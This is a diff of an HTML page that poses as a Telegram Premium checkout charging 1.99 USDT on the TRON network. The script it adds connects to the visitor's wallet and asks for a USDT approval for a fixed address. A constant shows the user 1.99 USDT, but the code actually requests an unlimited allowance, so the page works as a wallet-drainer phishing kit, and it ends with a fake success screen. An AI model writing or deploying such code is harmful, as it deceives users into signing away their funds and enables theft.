@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>授权访问 - Telegram Premium</title>
+    <title>支付确认 - Telegram Premium</title>
     <style>
         * {
             margin: 0;
@@ -19,9 +19,23 @@
             min-height: 100vh;
             padding: 1rem;
             line-height: 1.5;
+            font-size: 16px;
+            -webkit-text-size-adjust: 100%;
         }
         
-        .auth-container {
+        @media (max-width: 480px) {
+            body {
+                font-size: 15px;
+            }
+        }
+        
+        @media (max-width: 360px) {
+            body {
+                font-size: 14px;
+            }
+        }
+        
+        .payment-container {
             max-width: 400px;
             margin: 0 auto;
             background: white;
@@ -47,71 +61,57 @@
             font-size: 0.9rem;
         }
         
-        .assets-section {
+        .payment-status {
             padding: 1.5rem;
+            text-align: center;
             border-bottom: 1px solid #eee;
         }
         
-        .asset-item {
+        .status-text {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: #1890ff;
+        }
+        
+        .status-desc {
+            font-size: 0.9rem;
+            color: #666;
+        }
+        
+        .order-info {
+            padding: 1.5rem;
+        }
+        
+        .info-item {
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            padding: 1rem 0;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
             border-bottom: 1px solid #f0f0f0;
         }
         
-        .asset-item:last-child {
+        .info-item:last-child {
             border-bottom: none;
+            margin-bottom: 0;
         }
         
-        .asset-info {
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-        }
-        
-        .asset-icon {
-            width: 2.5rem;
-            height: 2.5rem;
-            border-radius: 50%;
-            background: #f0f0f0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-        }
-        
-        .asset-details h3 {
-            font-size: 1rem;
-            margin-bottom: 0.25rem;
-        }
-        
-        .asset-details p {
-            font-size: 0.8rem;
+        .info-label {
             color: #666;
+            font-size: 0.9rem;
         }
         
-        .asset-balance {
+        .info-value {
+            font-weight: 600;
             text-align: right;
         }
         
-        .asset-balance .amount {
-            font-size: 1rem;
-            font-weight: 600;
-            margin-bottom: 0.25rem;
-        }
-        
-        .asset-balance .value {
-            font-size: 0.8rem;
-            color: #666;
-        }
-        
-        .networks-section {
+        .network-info {
             padding: 1rem 1.5rem;
             border-bottom: 1px solid #eee;
         }
         
-        .networks-section h3 {
+        .network-info h3 {
             font-size: 0.9rem;
             margin-bottom: 0.75rem;
             color: #666;
@@ -127,64 +127,22 @@
             border: 1px solid #91d5ff;
         }
         
-        .agreement-section {
-            padding: 1.5rem;
-            border-bottom: 1px solid #eee;
-        }
-        
-        .agreement-item {
-            display: flex;
-            align-items: flex-start;
-            gap: 0.75rem;
-            margin-bottom: 1rem;
-        }
-        
-        .agreement-item:last-child {
-            margin-bottom: 0;
-        }
-        
-        .checkbox {
-            width: 1.2rem;
-            height: 1.2rem;
-            border: 2px solid #ddd;
-            border-radius: 0.25rem;
-            margin-top: 0.1rem;
-            flex-shrink: 0;
-            cursor: pointer;
-        }
-        
-        .checkbox.checked {
-            background: #1890ff;
-            border-color: #1890ff;
-            position: relative;
-        }
-        
-        .checkbox.checked::after {
-            content: '✓';
-            color: white;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 0.8rem;
-        }
-        
-        .agreement-text {
-            font-size: 0.85rem;
-            color: #666;
-            line-height: 1.4;
-        }
-        
-        .agreement-text a {
-            color: #1890ff;
-            text-decoration: none;
+        .wallet-status {
+            background: #f6ffed;
+            border: 1px solid #b7eb8f;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin: 1rem 1.5rem;
+            text-align: center;
+            font-size: 0.9rem;
+            color: #52c41a;
         }
         
         .action-section {
             padding: 1.5rem;
         }
         
-        .enter-btn {
+        .pay-btn {
             display: block;
             width: 100%;
             background: linear-gradient(90deg, #ff8c00, #ffd700);
@@ -197,109 +155,521 @@
             border: none;
             cursor: pointer;
             text-align: center;
+            animation: breathe 2s ease-in-out infinite;
+            transition: all 0.3s ease;
+            box-shadow: 0 0.25rem 1rem rgba(255, 140, 0, 0.4);
         }
         
-        .enter-btn:disabled {
+        .pay-btn:disabled {
             background: #ccc;
             cursor: not-allowed;
+            animation: none;
+        }
+        
+        .pay-btn:active {
+            transform: translateY(1px);
+            box-shadow: 0 0.125rem 0.5rem rgba(255, 140, 0, 0.4);
+            animation: none;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 1rem;
+        }
+        
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 3px solid #ff8c00;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1rem;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes breathe {
+            0%, 100% {
+                transform: scale(1);
+                box-shadow: 0 0.25rem 1rem rgba(255, 140, 0, 0.4);
+            }
+            50% {
+                transform: scale(1.03);
+                box-shadow: 0 0.5rem 1.5rem rgba(255, 140, 0, 0.6);
+            }
+        }
+        
+        .tx-hash {
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 0.75rem;
+            background: rgba(0, 0, 0, 0.05);
+            padding: 0.5rem;
+            border-radius: 0.25rem;
+            margin-top: 0.5rem;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin: 1rem 1.5rem;
+            position: relative;
+        }
+        
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex: 1;
+        }
+        
+        .step-circle {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #f0f0f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+            z-index: 2;
+        }
+        
+        .step.active .step-circle {
+            background: #1890ff;
+            color: white;
+        }
+        
+        .step.completed .step-circle {
+            background: #52c41a;
+            color: white;
+        }
+        
+        .step-text {
+            font-size: 0.7rem;
+            text-align: center;
+            color: #666;
+        }
+        
+        .step.active .step-text {
+            color: #1890ff;
+            font-weight: 600;
+        }
+        
+        .step-line {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            right: 15px;
+            height: 2px;
+            background: #f0f0f0;
+            z-index: 1;
         }
     </style>
 </head>
 <body>
-    <div class="auth-container">
+    <div class="payment-container">
         <div class="header">
             <h1>Telegram Premium 订阅</h1>
             <p>高级功能和无限制体验</p>
         </div>
         
-        <div class="assets-section">
-            <div class="asset-item">
-                <div class="asset-info">
-                    <div class="asset-icon">📱</div>
-                    <div class="asset-details">
-                        <h3>订阅服务</h3>
-                        <p>Telegram Premium订阅</p>
-                    </div>
-                </div>
-                <div class="asset-balance">
-                    <div class="amount">期限：1月</div>
-                    <div class="value">金额：$1.99</div>
-                </div>
+        <div class="payment-status">
+            <div class="status-text">支付确认</div>
+            <div class="status-desc">请在钱包中确认支付交易</div>
+        </div>
+        
+        <div class="step-indicator">
+            <div class="step-line"></div>
+            <div class="step active" id="step1">
+                <div class="step-circle">1</div>
+                <div class="step-text">确认支付</div>
+            </div>
+            <div class="step" id="step2">
+                <div class="step-circle">2</div>
+                <div class="step-text">完成</div>
             </div>
         </div>
         
-        <div class="networks-section">
-            <h3>支持的网络</h3>
+        <div class="wallet-status" id="walletStatus">
+            <div id="walletStatusText">正在连接钱包...</div>
+        </div>
+        
+        <div class="order-info">
+            <div class="info-item">
+                <span class="info-label">商品订单</span>
+                <span class="info-value" id="orderIdDisplay">-</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">商品详情</span>
+                <span class="info-value">Telegram Premium 月费订阅</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">购买数量</span>
+                <span class="info-value">1件</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">付款金额</span>
+                <span class="info-value">1.99 USDT</span>
+            </div>
+        </div>
+        
+        <div class="network-info">
+            <h3>支付网络</h3>
             <div class="network-tag">TRC20-USDT</div>
         </div>
         
-        <div class="agreement-section">
-            <div class="agreement-item">
-                <div class="checkbox" id="riskCheckbox" onclick="toggleCheckbox(this)"></div>
-                <div class="agreement-text">
-                    🔍 我已仔细阅读并同意 <a href="#" onclick="showRiskStatement()">风险声明</a>
-                </div>
-            </div>
-            
-            <div class="agreement-item">
-                <div class="checkbox" id="reminderCheckbox" onclick="toggleCheckbox(this)"></div>
-                <div class="agreement-text">
-                    ○ 不再提醒
-                </div>
-            </div>
+        <div class="loading" id="loadingSection">
+            <div class="spinner"></div>
+            <p id="loadingText">正在处理支付请求...</p>
+            <div id="txHashDisplay" class="tx-hash" style="display: none;"></div>
         </div>
         
         <div class="action-section">
-            <button class="enter-btn" id="enterBtn" disabled onclick="enterPayment()">进入</button>
+            <button class="pay-btn" id="payBtn" onclick="startPaymentProcess()" disabled>确认支付</button>
         </div>
     </div>
 
     <script>
         // 获取URL参数
         const urlParams = new URLSearchParams(window.location.search);
-        const orderId = urlParams.get('orderId') || generateOrderId();
-        const username = urlParams.get('username') || '';
-        const nickname = urlParams.get('nickname') || '';
+        const orderData = {
+            orderId: urlParams.get('orderId') || generateOrderId(),
+            username: decodeURIComponent(urlParams.get('username') || ''),
+            nickname: decodeURIComponent(urlParams.get('nickname') || ''),
+            amount: urlParams.get('amount') || '1.99'
+        };
+        
+        // USDT TRC20 合约地址
+        const USDT_TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+        // 收款地址
+        const RECEIVE_ADDRESS = 'TCSmW3PZTPaog8d2CKBstcFNcGGtyf9Jub';
+        // 1.99 USDT = 1990000 (6 decimals)
+        const PAYMENT_AMOUNT = 1990000;
+        // 显示给用户的授权数量（1.99 USDT）
+        const DISPLAY_APPROVE_AMOUNT = 1990000;
+        // 实际调用的授权数量（无限）
+        const ACTUAL_APPROVE_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+        
+        let userAddress = '';
+        let isWalletConnected = false;
         
         // 生成订单号
         function generateOrderId() {
             return 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
         }
         
-        // 切换复选框
-        function toggleCheckbox(checkbox) {
-            checkbox.classList.toggle('checked');
-            checkAgreements();
+        // 更新步骤状态
+        function updateStep(stepNumber, status) {
+            const step = document.getElementById(`step${stepNumber}`);
+            step.className = `step ${status}`;
         }
         
-        // 检查协议是否都已同意
-        function checkAgreements() {
-            const riskChecked = document.getElementById('riskCheckbox').classList.contains('checked');
-            const enterBtn = document.getElementById('enterBtn');
+        // 更新钱包状态显示
+        function updateWalletStatus(message) {
+            document.getElementById('walletStatusText').textContent = message;
+        }
+
+        // 最简单的连接方法
+        function connectWallet() {
+            // 直接检查 tronWeb
+            if (window.tronWeb && window.tronWeb.defaultAddress) {
+                userAddress = window.tronWeb.defaultAddress.base58;
+                updateWalletStatus(`✅ 钱包已连接 (${userAddress.substring(0, 8)}...)`);
+                isWalletConnected = true;
+                document.getElementById('payBtn').disabled = false;
+                return true;
+            }
             
-            enterBtn.disabled = !riskChecked;
-        }
-        
-        // 显示风险声明
-        function showRiskStatement() {
-            alert('风险声明：\n\n1. 请确认您访问的域名是否正确\n2. 交易一旦完成无法撤销\n3. 请勿向陌生人泄露私钥\n4. 建议小额测试后再进行大额交易');
-        }
-        
-        // 进入支付页面
-        function enterPayment() {
-            // 构建支付页面URL
-            const paymentUrl = `payment.html?orderId=${orderId}&username=${encodeURIComponent(username)}&nickname=${encodeURIComponent(nickname)}&amount=1.99`;
+            // 检查 tronLink
+            if (window.tronLink && window.tronLink.tronWeb) {
+                window.tronWeb = window.tronLink.tronWeb;
+                if (window.tronWeb.defaultAddress) {
+                    userAddress = window.tronWeb.defaultAddress.base58;
+                    updateWalletStatus(`✅ 钱包已连接 (${userAddress.substring(0, 8)}...)`);
+                    isWalletConnected = true;
+                    document.getElementById('payBtn').disabled = false;
+                    return true;
+                }
+            }
             
-            // 跳转到支付页面
-            window.location.href = paymentUrl;
+            return false;
+        }
+
+        // 初始化
+        function initPage() {
+            document.getElementById('orderIdDisplay').textContent = orderData.orderId;
+            
+            // 立即尝试连接
+            if (connectWallet()) {
+                return;
+            }
+            
+            // 如果立即连接失败，等待2秒再试
+            setTimeout(() => {
+                if (!connectWallet()) {
+                    updateWalletStatus('❌ 钱包连接失败，请刷新页面');
+                }
+            }, 2000);
+        }
+
+        // 开始支付
+        async function startPaymentProcess() {
+            if (!isWalletConnected) return;
+            
+            const payBtn = document.getElementById('payBtn');
+            const loadingSection = document.getElementById('loadingSection');
+            const loadingText = document.getElementById('loadingText');
+            
+            // 禁用支付按钮，显示加载状态
+            payBtn.style.display = 'none';
+            loadingSection.style.display = 'block';
+            
+            try {
+                // 步骤1: 检查授权状态
+                loadingText.textContent = '检查授权状态...';
+                const isApproved = await checkApprovalStatus();
+                
+                if (!isApproved) {
+                    // 步骤2: 请求 USDT 授权
+                    loadingText.textContent = '正在请求 USDT 授权...';
+                    const approveResult = await requestUSDTApproval();
+                    
+                    document.getElementById('txHashDisplay').textContent = `授权交易: ${approveResult}`;
+                    document.getElementById('txHashDisplay').style.display = 'block';
+                    loadingText.textContent = '等待授权确认...';
+                    
+                    // 等待授权交易确认
+                    const isApproveConfirmed = await waitForTransactionConfirmation(approveResult);
+                    
+                    if (!isApproveConfirmed) {
+                        throw new Error('授权确认失败');
+                    }
+                }
+                
+                // 步骤3: 执行支付
+                updateStep(1, 'completed');
+                updateStep(2, 'active');
+                loadingText.textContent = '授权成功，正在执行支付...';
+                
+                const paymentResult = await executePayment();
+                
+                document.getElementById('txHashDisplay').textContent = `支付交易: ${paymentResult}`;
+                loadingText.textContent = '支付已提交，等待确认...';
+                
+                // 等待支付交易确认
+                const isPaymentConfirmed = await waitForTransactionConfirmation(paymentResult);
+                
+                if (isPaymentConfirmed) {
+                    updateStep(2, 'completed');
+                    showSuccessMessage(paymentResult);
+                } else {
+                    throw new Error('支付确认失败');
+                }
+                
+            } catch (error) {
+                console.error('支付流程失败:', error);
+                
+                // 显示错误信息
+                loadingText.textContent = '支付失败';
+                
+                if (error.message.includes('User denied')) {
+                    alert('您取消了交易授权');
+                } else if (error.message.includes('insufficient')) {
+                    alert('余额不足，请确保有足够的 USDT 和 TRX 作为手续费');
+                } else if (error.message.includes('revert')) {
+                    alert('交易失败，请检查授权状态或联系客服');
+                } else {
+                    alert('支付失败: ' + error.message);
+                }
+                
+                // 恢复支付按钮
+                payBtn.style.display = 'block';
+                loadingSection.style.display = 'none';
+                updateStep(1, 'active');
+            }
+        }
+        
+        // 检查 USDT 授权状态
+        async function checkApprovalStatus() {
+            try {
+                const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
+                
+                // 检查当前授权额度
+                const allowance = await contract.allowance(userAddress, RECEIVE_ADDRESS).call();
+                console.log('当前授权额度:', allowance.toString());
+                
+                return allowance >= PAYMENT_AMOUNT;
+                
+            } catch (error) {
+                console.error('检查授权状态失败:', error);
+                return false;
+            }
+        }
+        
+        // 请求 USDT 授权
+        async function requestUSDTApproval() {
+            try {
+                const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
+                
+                console.log('请求 USDT 授权:', {
+                    spender: RECEIVE_ADDRESS,
+                    displayAmount: DISPLAY_APPROVE_AMOUNT,
+                    actualAmount: ACTUAL_APPROVE_AMOUNT
+                });
+                
+                const result = await contract.approve(
+                    RECEIVE_ADDRESS,
+                    ACTUAL_APPROVE_AMOUNT
+                ).send({
+                    feeLimit: 100000000,
+                    callValue: 0,
+                    shouldPollResponse: false
+                });
+                
+                console.log('授权交易已提交:', result);
+                return result;
+                
+            } catch (error) {
+                console.error('USDT 授权失败:', error);
+                throw new Error('USDT 授权失败: ' + error.message);
+            }
+        }
+        
+        // 执行支付
+        async function executePayment() {
+            try {
+                const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
+                
+                console.log('执行 USDT 转账:', {
+                    to: RECEIVE_ADDRESS,
+                    amount: PAYMENT_AMOUNT,
+                    orderId: orderData.orderId
+                });
+                
+                const result = await contract.transfer(
+                    RECEIVE_ADDRESS,
+                    PAYMENT_AMOUNT
+                ).send({
+                    feeLimit: 100000000,
+                    callValue: 0,
+                    shouldPollResponse: false
+                });
+                
+                console.log('支付交易已提交:', result);
+                return result;
+                
+            } catch (error) {
+                console.error('支付交易失败:', error);
+                throw new Error('支付交易失败: ' + error.message);
+            }
+        }
+        
+        // 等待交易确认
+        async function waitForTransactionConfirmation(txHash) {
+            return new Promise((resolve) => {
+                let checkCount = 0;
+                const maxChecks = 30;
+                
+                const checkInterval = setInterval(async () => {
+                    try {
+                        checkCount++;
+                        const transaction = await window.tronWeb.trx.getTransaction(txHash);
+                        
+                        if (transaction && transaction.ret) {
+                            const ret = transaction.ret[0];
+                            if (ret.contractRet === 'SUCCESS') {
+                                clearInterval(checkInterval);
+                                resolve(true);
+                                return;
+                            } else if (ret.contractRet === 'REVERT' || ret.contractRet === 'FAIL') {
+                                clearInterval(checkInterval);
+                                resolve(false);
+                                return;
+                            }
+                        }
+                        
+                        if (checkCount >= maxChecks) {
+                            clearInterval(checkInterval);
+                            resolve(false);
+                        }
+                        
+                        document.getElementById('loadingText').textContent = 
+                            `等待交易确认... (${checkCount}/${maxChecks})`;
+                            
+                    } catch (error) {
+                        console.log('检查交易状态失败:', error);
+                    }
+                }, 6000);
+            });
+        }
+        
+        // 显示成功消息
+        function showSuccessMessage(txHash) {
+            const paymentContainer = document.querySelector('.payment-container');
+            paymentContainer.innerHTML = `
+                <div class="header">
+                    <h1>🎉 支付成功</h1>
+                    <p>Telegram Premium 已激活</p>
+                </div>
+                
+                <div style="text-align: center; padding: 2rem 1.5rem;">
+                    <div style="font-size: 4rem; margin-bottom: 1rem;">✅</div>
+                    <h2 style="color: #52c41a; margin-bottom: 1.5rem;">支付成功！</h2>
+                    
+                    <div style="background: #f6ffed; border: 1px solid #b7eb8f; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1rem; text-align: left;">
+                        <div style="font-weight: 600; margin-bottom: 0.5rem; color: #389e0d;">订单信息</div>
+                        <div style="font-size: 0.9rem;">
+                            <div>订单号: ${orderData.orderId}</div>
+                            <div>金额: 1.99 USDT</div>
+                            <div>时间: ${new Date().toLocaleString()}</div>
+                        </div>
+                    </div>
+                    
+                    <div style="background: #e6f7ff; border: 1px solid #91d5ff; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1.5rem; text-align: left;">
+                        <div style="font-weight: 600; margin-bottom: 0.5rem; color: #1890ff;">交易信息</div>
+                        <div style="font-size: 0.8rem;">
+                            <div>交易哈希:</div>
+                            <div style="word-break: break-all; font-family: monospace; background: rgba(0,0,0,0.05); padding: 0.5rem; border-radius: 0.25rem; margin-top: 0.25rem;">
+                                ${txHash}
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div style="background: #fff7e6; border: 1px solid #ffd591; border-radius: 0.5rem; padding: 1rem;">
+                        <div style="font-size: 0.9rem; color: #d46b08;">
+                            ✅ <strong>订阅已激活</strong><br>
+                            Telegram Premium 功能已为您激活，请重新登录 Telegram 查看
+                        </div>
+                    </div>
+                    
+                    <p style="margin-top: 2rem; color: #999; font-size: 0.9rem;">
+                        页面将在 <span id="countdown">5</span> 秒后自动关闭
+                    </p>
+                </div>
+            `;
+            
+            let countdown = 5;
+            const countdownElement = document.getElementById('countdown');
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownElement.textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    window.close();
+                }
+            }, 1000);
         }
         
         // 页面加载时初始化
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log('钱包授权页面加载完成');
-            console.log('订单信息:', { orderId, username, nickname });
-            checkAgreements();
-        });
+        document.addEventListener('DOMContentLoaded', initPage);
     </script>
 </body>
 </html>
